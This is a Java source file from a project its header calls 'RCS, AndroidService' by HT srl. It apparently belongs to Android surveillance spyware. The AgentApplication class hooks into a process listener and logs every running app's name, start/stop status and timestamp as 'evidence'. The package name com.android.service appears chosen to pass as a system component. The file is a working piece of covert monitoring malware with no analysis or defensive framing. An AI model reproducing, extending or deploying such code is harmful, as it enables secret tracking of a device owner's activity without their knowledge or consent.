/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AgentApplication.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.agent;

import java.util.ArrayList;

import android.app.ActivityManager.RunningAppProcessInfo;

import com.android.service.LogR;
import com.android.service.ProcessInfo;
import com.android.service.ProcessStatus;
import com.android.service.auto.Cfg;
import com.android.service.evidence.Evidence;
import com.android.service.evidence.EvidenceType;
import com.android.service.interfaces.IncrementalLog;
import com.android.service.interfaces.Observer;
import com.android.service.listener.ListenerProcess;
import com.android.service.util.Check;
import com.android.service.util.DateTime;
import com.android.service.util.Utils;
import com.android.service.util.WChar;

public class AgentApplication extends AgentBase implements IncrementalLog, Observer<ProcessInfo> {
	private static final String TAG = "AgentApplication";

	@Override
	public boolean parse(AgentConf conf) {
		return true;
	}

	@Override
	public void go() {

	}

	LogR logIncremental;

	@Override
	public void begin() {
		logIncremental = new LogR(EvidenceType.APPLICATION);
		ListenerProcess.self().attach(this);
	}

	@Override
	public void end() {
		ListenerProcess.self().detach(this);
		logIncremental.close();
	}

	public int notification(ProcessInfo process) {
		saveEvidence(process.processInfo, process.status);
		return 0;
	}

	private void saveEvidence(RunningAppProcessInfo process, ProcessStatus status) {
		if (Cfg.DEBUG) {
			Check.requires(process != null, "null process");
		}

		final String name = process.processName;
		final String module = process.processName;

		final byte[] tm = (new DateTime()).getStructTm();

		final ArrayList<byte[]> items = new ArrayList<byte[]>();
		items.add(tm);
		items.add(WChar.getBytes(name, true));
		items.add(WChar.getBytes(status.name(), true));
		items.add(WChar.getBytes(module, true));
		items.add(Utils.intToByteArray(Evidence.EVIDENCE_DELIMITER));

		if (Cfg.DEBUG) {
			Check.asserts(logIncremental != null, "null log");
		}
		logIncremental.write(items);

		if (Cfg.DEBUG) {
			Check.log(TAG + " (saveEvidence): " + name + " " + status.name());
		}
	}

	public void resetLog() {
		if(logIncremental.hasData()){
			logIncremental.close();
			logIncremental = new LogR(EvidenceType.APPLICATION);
		}
	}

}
